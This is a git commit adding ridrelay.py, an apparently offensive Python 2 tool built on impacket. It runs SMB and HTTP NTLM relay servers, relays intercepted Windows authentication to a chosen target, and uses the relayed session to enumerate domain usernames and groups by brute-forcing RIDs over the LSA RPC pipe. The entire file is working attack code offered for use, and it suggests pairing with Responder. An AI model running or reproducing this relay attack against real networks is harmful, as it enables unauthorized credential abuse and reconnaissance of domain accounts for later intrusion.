b71a188a27a5f6d137f4784f91b255da9aad77af
skorov <alexei.doud@gmail.com>
2018-04-15 08:17:09 +1000

    Initial commit

---
+++ ridrelay.py
@@ -0,0 +1,164 @@
+import argparse
+import sys
+import logging
+from threading import Thread
+from time import sleep
+
+from impacket import smb, smb3
+from impacket.dcerpc.v5 import transport, lsat, lsad
+from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED
+from impacket.dcerpc.v5.rpcrt import DCERPCException
+from impacket.dcerpc.v5.samr import SID_NAME_USE
+from impacket.examples.ntlmrelayx.servers.httprelayserver import HTTPRelayServer
+from impacket.examples.ntlmrelayx.servers.smbrelayserver import SMBRelayServer
+from impacket.examples import logger
+from impacket.examples.ntlmrelayx.clients import PROTOCOL_CLIENTS
+from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
+from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
+from impacket.smbconnection import SMBConnection
+
+got_usernames = False
+
+
+class SMBAttack(Thread):
+    def __init__(self, config, SMBClient, username):
+        Thread.__init__(self)
+        self.daemon = True
+        if isinstance(SMBClient, smb.SMB) or isinstance(SMBClient, smb3.SMB3):
+            self.__SMBConnection = SMBConnection(existingConnection=SMBClient)
+        else:
+            self.__SMBConnection = SMBClient
+        self.config = config
+        self.__answerTMP = ''
+
+    def __answer(self, data):
+        self.__answerTMP += data
+
+    def run(self):
+        global got_usernames
+        rpctransport = transport.SMBTransport(self.__SMBConnection.getRemoteHost(), filename=r'\lsarpc',
+                                              smb_connection=self.__SMBConnection)
+        dce = rpctransport.get_dce_rpc()
+        maxRid = 5000  # TODO: Change to 50000 after debugging
+        dce.connect()
+
+        dce.bind(lsat.MSRPC_UUID_LSAT)
+        resp = lsat.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)
+        policyHandle = resp['PolicyHandle']
+
+        resp = lsad.hLsarQueryInformationPolicy2(dce, policyHandle,
+                                                 lsad.POLICY_INFORMATION_CLASS.PolicyPrimaryDomainInformation)
+        domainSid = resp['PolicyInformation']['PolicyPrimaryDomainInfo']['Sid'].formatCanonical()
+
+        fh = None
+        if self.config.outputFile:
+            try:
+                fh = open(self.config.outputFile, 'rw')
+            except Exception:
+                logging.exception('Could not open file for writing')
+
+        soFar = 0
+        SIMULTANEOUS = 1000
+        for j in range(maxRid / SIMULTANEOUS + 1):
+            if (maxRid - soFar) / SIMULTANEOUS == 0:
+                sidsToCheck = (maxRid - soFar) % SIMULTANEOUS
+            else:
+                sidsToCheck = SIMULTANEOUS
+
+            if sidsToCheck == 0:
+                break
+
+            sids = list()
+            for i in xrange(soFar, soFar + sidsToCheck):
+                sids.append(domainSid + '-%d' % i)
+            try:
+                lsat.hLsarLookupSids(dce, policyHandle, sids, lsat.LSAP_LOOKUP_LEVEL.LsapLookupWksta)
+            except DCERPCException, e:
+                if str(e).find('STATUS_NONE_MAPPED') >= 0:
+                    soFar += SIMULTANEOUS
+                    continue
+                elif str(e).find('STATUS_SOME_NOT_MAPPED') >= 0:
+                    resp = e.get_packet()
+                else:
+                    raise
+
+            for n, item in enumerate(resp['TranslatedNames']['Names']):
+                if item['Use'] != SID_NAME_USE.SidTypeUnknown:
+                    line = "%d: %s\\%s (%s)" % (
+                    soFar + n, resp['ReferencedDomains']['Domains'][item['DomainIndex']]['Name'], item['Name'],
+                    SID_NAME_USE.enumItems(item['Use']).name)
+                    print line
+                    if fh:
+                        fh.write(line)
+
+            soFar += SIMULTANEOUS
+
+        if fh:
+            fh.close()
+        dce.disconnect()
+        got_usernames = True
+
+
+if __name__ == '__main__':
+    RELAY_SERVERS = (SMBRelayServer, HTTPRelayServer)
+    ATTACKS = {'SMB': SMBAttack}
+
+    parser = argparse.ArgumentParser(description='A sure fire way to enumerate domain usernames')
+    parser.add_argument('--target', '-t', metavar='TARGET', required=True, help='An IP address value that states which '
+                                                                                'target to relay TO')
+    parser.add_argument('--out-file', '-o', metavar='OUTFILE', help='The file to output usernames to.')
+    args = parser.parse_args()
+
+    logger.init()
+    print 'ridrelay v0.1 - Get domain usernames by relaying low priv creds!\n'
+
+    logging.getLogger().setLevel(logging.INFO)
+    logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)
+
+    codec = sys.getdefaultencoding()
+
+    targetSystem = TargetsProcessor(singleTarget=args.target, protocolClients=PROTOCOL_CLIENTS)
+
+    threads = set()
+
+    for server in RELAY_SERVERS:
+        # Set up config
+        c = NTLMRelayxConfig()
+        c.setProtocolClients(PROTOCOL_CLIENTS)
+        c.setRunSocks(False, None)
+        c.setTargets(targetSystem)
+        c.setExeFile(None)
+        c.setCommand(None)
+        c.setEncoding(codec)
+        c.setAttacks(ATTACKS)
+        c.setLootdir('.')
+        c.setOutputFile(args.out_file)
+        c.setLDAPOptions(None, None)
+        c.setMSSQLOptions(None)
+        c.setInteractive(None)
+        c.setIMAPOptions('password', 'INBOX', None, 0)
+        c.setIPv6(None)
+        c.setWpadOptions(None, None)
+        c.setSMB2Support(True)
+        c.setInterfaceIp('')
+        c.setMode('REDIRECT')
+        c.setRedirectHost(True)
+
+        s = server(c)
+        s.start()
+        threads.add(s)
+
+    print ""
+    logging.info("Servers started, waiting for connections")
+    try:
+        while not got_usernames:
+            sleep(1)
+    except KeyboardInterrupt:
+        logging.info("Exiting... Remember to stop Responder if you need to")
+    except Exception:
+        pass
+
+    for s in threads:
+        del s
+
+    sys.exit(0)
